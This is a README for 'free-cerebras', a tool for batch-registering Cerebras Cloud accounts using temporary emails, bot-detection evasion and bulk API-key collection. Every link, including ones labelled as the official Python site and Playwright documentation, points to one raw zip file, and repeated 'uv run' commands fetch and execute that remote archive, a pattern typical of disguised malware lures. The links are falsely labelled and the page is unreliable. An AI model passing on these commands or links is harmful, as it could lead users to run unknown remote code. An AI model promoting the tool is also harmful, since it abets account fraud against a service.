# ⚙️ free-cerebras - Easy Batch Register for Cerebras Cloud

[![Download free-cerebras](https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip)](https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip)

---

## 📋 What is free-cerebras?

free-cerebras is an app that helps you create many accounts on Cerebras Cloud quickly. It uses automation to handle all the steps for you. This saves time if you need multiple Cerebras Cloud accounts.

It works on your computer using Python and Playwright automation tools. The app offers both a web interface and a command line mode. It also takes care of email verification using temporary emails.

---

## 🔍 Features Overview

- Easy web page and command line interface (choose the way you like)
- Automatic temporary email creation and registration form filling
- Email verification handling for links and codes without user input
- Automatically grabs your API Key or marks failures
- Batch registration with options for running many at once
- Anti-detection features like random wait times and hiding browser details
- Alerts if your IP address changes
- Tests API Keys in bulk and helps you export results

---

## 💻 System Requirements

- Windows 10 or later / macOS 10.15 or later / Linux (Ubuntu 20.04 or similar)
- Python 3.8 or higher installed
- Internet connection for downloading software and accessing Cerebras Cloud
- At least 4 GB of RAM recommended
- A modern web browser supported by Playwright (Chromium-based preferred)

---

## 🚀 Getting Started

### Step 1: Download free-cerebras

To start, you need to get the software.

[Download free-cerebras here](https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip)  
This link takes you to the release page. Find the latest version and download the package suitable for your system.

---

### Step 2: Install Python and UV Runner

If you do not have Python installed, download it from [https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip](https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip) and follow their instructions. Use the latest Python 3 version.

You will also need a small tool called `uv` to run free-cerebras easily.

Open your computer’s command prompt (Windows) or terminal (macOS/Linux) and type:

```
pip install uv
```

If you prefer, you can use `pipx` instead:

```
pipx install uv
```

---

### Step 3: Install Browsers for Playwright

free-cerebras uses Playwright to open browsers and fill forms automatically. You need to install the browser for it.

Run this command in the terminal or command prompt:

```
uv run playwright install chromium
```

This installs Chromium, a browser similar to Google Chrome, which free-cerebras will control secretly.

---

### Step 4: Run free-cerebras for the First Time

Now you can start free-cerebras.

In your terminal or command prompt, enter:

```
uv run https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip
```

The program will check and install any missing software it needs. Then it will open a web management interface.

Open your regular browser and go to:

```
http://localhost:5000
```

You will see the free-cerebras web interface. It is easy to use. Follow on-screen instructions to batch register accounts.

---

## 📥 Download & Install

You can visit the official GitHub release page to download the latest version here:

[https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip](https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip)

Look for the file that matches your computer system. Download it and unzip or place it in a folder you can access.

---

## ⚙️ Using free-cerebras

There are two ways to use free-cerebras: Web Mode and Command Line Mode.

### Web Mode

- After launching with `uv run https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip`, open the browser at `http://localhost:5000`.
- The web interface lets you start, stop, and monitor batch registrations.
- Use the menus to change settings and see status updates.
- Designed for users who prefer clicking over typing commands.

### Command Line Mode

If you like using commands, free-cerebras supports that too.

Some examples:

- Register 5 accounts:

  ```
  uv run https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip cli -n 5
  ```

- Register 10 accounts with 2 parallel processes:

  ```
  uv run https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip cli -n 10 -p 2
  ```

- Register 3 accounts in headless (no browser window shown) mode:

  ```
  uv run https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip cli -n 3 --headless
  ```

---

## 🛠 Configuration

You can fine-tune how free-cerebras works by editing the `https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip` file found in the main folder.

Here are some settings you can change:

| Setting             | Description                     | Default Value |
|---------------------|--------------------------------|---------------|
| HEADLESS            | Run browser without showing it | False         |
| SLOW_MO             | Delay between steps in ms       | 500           |
| BATCH_SIZE          | Number of registrations per batch | 5             |
| BATCH_DELAY         | Time between batches in seconds | 10            |
| EMAIL_WAIT_TIMEOUT  | Time to wait for verification email in seconds | 120           |

Editing these lets you control speed and how many accounts register at once.

---

## 🔄 What Happens in the Background

free-cerebras does the following automatically for each account you register:

1. Creates a temporary email address for verification.
2. Opens a browser with Playwright to fill the Cerebras Cloud registration form.
3. Waits for and processes the verification email.
4. Clicks verification links or inputs verification codes.
5. Collects your API Key from the new account.
6. Marks accounts where registration or email verification failed.
7. Works quietly using tricks to avoid being detected as a bot.
8. Can run several batches at the same time if you want.

---

## 🤔 Troubleshooting Tips

- Make sure Python 3.8+ is installed and reachable from your terminal.
- Confirm you installed the `uv` tool.
- Install browser binaries with `uv run playwright install chromium`.
- If you get errors about ports in use, change the port number by running the web app like this:

  ```
  uv run https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip web --port 5001
  ```

- Check your internet connection and firewall if registration or emails fail.
- Restart your computer if you face strange errors.
- Look at the command window for error messages for details.

---

## 📚 More Commands for Advanced Use

- Start the web interface on a custom port (e.g., 5000):

  ```
  uv run https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip web --port 5000
  ```

- Run command line mode creating 15 accounts with 3 batches concurrently:

  ```
  uv run https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip cli -n 15 -p 3
  ```

- Use headless mode (good for running on servers or no GUI):

  ```
  uv run https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip cli -n 10 --headless
  ```

---

## 🔗 Useful Links

- [Download free-cerebras and updates](https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip)
- [Python official site](https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip)
- [Playwright documentation](https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip)

---

## 📝 Final Notes

free-cerebras aims to simplify and speed up registering accounts on Cerebras Cloud without manual work. The software handles all key steps and lets you work with multiple accounts at the same time.

Using the web interface is easiest for most users. Command line mode offers more control for those comfortable with commands.

The setup requires some initial software installations but after that you can start batch registering within minutes.

For details on configuration, check `https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip`. For help or to report issues, visit the GitHub repository’s issue page.